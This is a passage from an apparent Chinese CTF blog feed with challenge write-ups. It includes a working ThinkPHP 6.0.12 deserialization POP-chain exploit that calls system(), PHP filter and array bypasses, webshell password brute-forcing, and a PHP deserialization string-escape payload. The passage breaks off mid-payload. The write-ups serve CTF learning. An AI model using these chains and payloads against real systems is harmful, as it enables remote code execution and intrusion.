punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">:</span>            flag<span class="token operator">+=</span><span class="token number">1</span>            output<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">:</span>                flag<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">if</span> flag<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>            output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'output :'</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>out<span class="token punctuation">(</span><span class="token string">"1.txt"</span><span class="token punctuation">)</span>out<span class="token punctuation">(</span><span class="token string">"2.txt"</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后用Notepad++打开转ASCII保存，再用rar打开，输入密码即可拿到flag…..</p><p>但是当时我们做的时候，确实没想到这个是个压缩包，把信息提取出来了，看到了内容….没往压缩包上考虑</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h2><h4 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a><strong>Ezpop</strong></h4><ol><li>Thinkphp6.0.12LTS 反序列化漏洞<a href="https://www.jianshu.com/p/92018015ec5e">https://www.jianshu.com/p/92018015ec5e</a> </li><li>Exp.php </li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">&#123;</span>     <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span><span class="token punctuation">&#123;</span>         <span class="token keyword">private</span> <span class="token variable">$lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>         <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">private</span> <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>         <span class="token keyword">protected</span> <span class="token variable">$table</span><span class="token punctuation">;</span>         <span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">protected</span> <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">protected</span> <span class="token variable">$jsonAssoc</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>             <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>             <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'whoami'</span> <span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'cat /flag*'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>             <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">exists</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>             <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>             <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'whoami'</span> <span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>             <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>             <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">jsonAssoc</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">&#123;</span>     <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>     <span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">&#123;</span>     <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>     <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题记录 </tag>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bugkuCTF之web题目</title>
      <link href="/2022/05/24/BugKu%E4%B9%8BWeb%E9%A2%98%E7%9B%AE/"/>
      <url>/2022/05/24/BugKu%E4%B9%8BWeb%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><blockquote><p>描述: cookies欺骗</p></blockquote><p>进入题目之后我们可以看到这个题目的url</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;114.67.175.224:13933&#x2F;index.php?line&#x3D;&amp;filename&#x3D;a2V5cy50eHQ&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将a2V5cy50eHQ这个明显是Base64编码，进行解码知道是keys.txt，虽然不知道这个key.txt里面是什么，先复制出来。尝试用修改参数filename的值为index.php ,这个时候我们什么都看不到，</p><p>写一个脚本查下源代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsa<span class="token operator">=</span><span class="token number">30</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>    url<span class="token operator">=</span><span class="token string">"http://114.67.175.224:13933/index.php?line="</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"&amp;filename=aW5kZXgucGhw"</span>    s<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span>s<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来就是，分析源码了，这就进入了php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$line</span><span class="token operator">=</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'line'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'line'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">==</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file_list</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>                 <span class="token string single-quoted-string">'0'</span> <span class="token operator">=></span><span class="token string single-quoted-string">'keys.txt'</span><span class="token punctuation">,</span>                 <span class="token string single-quoted-string">'1'</span> <span class="token operator">=></span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">,</span>             <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'margin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'margin'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'margin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'keys.php'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$file_list</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$fa</span> <span class="token operator">=</span> <span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$fa</span><span class="token punctuation">[</span><span class="token variable">$line</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>hackbar</strong>里面就有cookie，虽然这个是在火狐里，直接开火狐，传一个margin=margin出去。查看源代码得到flag</p><h3 id="各种绕过哟"><a href="#各种绕过哟" class="headerlink" title="各种绕过哟"></a>各种绕过哟</h3><p>这个还是属于php特性吧，sha()函数无法处理数组，这里我们可以直接构造数组，传进去就能得到flag……..</p><pre class="line-numbers language-none"><code class="language-none">get:?uname[]&#x3D;1&amp;id&#x3D;marginpost:passwd[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h3><p>备份啊,估计bak文件吧……</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include_once</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key1</span> <span class="token operator">!==</span> <span class="token variable">$key2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token operator">.</span><span class="token string double-quoted-string">"取得flag"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>果然不是个签到啊，这样的话又回到了PHP特性的处理，还是可以通过数组进行绕过就能得到flag。</p><p>一开始没注意到过滤了key，这里可以使用双写绕过就是kekeyy在key被第一重的str_replace过滤之后我们仍然可以通过ke和y的拼接得到需要的key。</p><h3 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h3><p>先拿御剑扫描下后台，发现一个shell.php的页面进去，就是后门…..没有其他提示了，到这里应该就说明了是需要用burp爆破密码了，直接在火狐里打开挂代理，抓包爆破一气呵成，找到了hack这个长度与其他的返回不同</p><p>输进去看下得到flag</p><h3 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'2.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$key</span><span class="token operator">=</span><span class="token string single-quoted-string">'flag&#123;********************************&#125;'</span><span class="token punctuation">;</span><span class="token variable">$IM</span><span class="token operator">=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i"</span><span class="token punctuation">,</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$IM</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'key is: '</span><span class="token operator">.</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>1.表达式直接写出来的字符串直接利用，如key<br>2.“.”代表任意字符<br>3.“*”代表一个或一序列字符重复出现的次数，即前一个字符重复任意次<br>4.“/”代表“/”<br>5.[a-z]代表a-z中的任意一个字符<br>6.[[:punct:]]代表任意一个字符，包括各种符号<br>7./i代表大小写不敏感<br>8.{4-7}代表[0-9]中数字连续出现的次数是4-7次</p></blockquote><p>好了这样就可以构造了</p><pre class="line-numbers language-none"><code class="language-none">key@keykeykeykeykey:\\\\1keya@<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="BP"><a href="#BP" class="headerlink" title="BP"></a>BP</h3><blockquote><p> 弱密码top1000？z????? </p></blockquote><p>top1000的弱密码而且是以z开头的，这连burp都不用开了啊，开burp还需要时间，用Excel筛选，得出只有几个符合条件的密码，输入即可 </p><h3 id="newPHP"><a href="#newPHP" class="headerlink" title="newPHP"></a>newPHP</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// php版本:5.4.44</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: text/html; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">evil</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$hint</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span><span class="token operator">===</span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">)</span>            @<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"╭(●｀∀´●)╯"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token comment">//There's a hint in ./hint.php</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"╰(●’◡’●)╮"</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$r</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/is'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NoNoNo!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>emmmmm…..这道题考察的应该是php反序列化？</p><blockquote><p>php var_dump 函数作用是判断一个变量的类型与长度,并输出变量的数值,如果变量有值，输出的是变量的值并回返数据类型.</p></blockquote><p><strong>15:13用时33min…….</strong></p><p>在第一个类eval()里面有一个php强比较hint===”hint.php”，这里hint.php也就是我们需要构造的</p><pre class="line-numbers language-none"><code class="language-none">O:4:&quot;evil&quot;:1:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 是post进去<code>username</code>和<code>password</code>两个参数，然后触发的是User类，但是有个read和write方法，经过处理后才进行序列化 </p><p>然后看这两个函数，write和read两个函数，read()函数中将’\0\0\0’六个字符替换为了三个字符，这就给反序列化字符串逃逸提供了机会。 也就是php字符串逃逸导致的漏洞，即序列化的字符串在经过过滤函数不正确的处理而导致对象注入 </p><p>构造ployed：username=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;password=a”;s:8:”password”;O:4:”evil”:2:{s:4:”hint”;s:8:”hint.php”;}</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$r</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>令username= 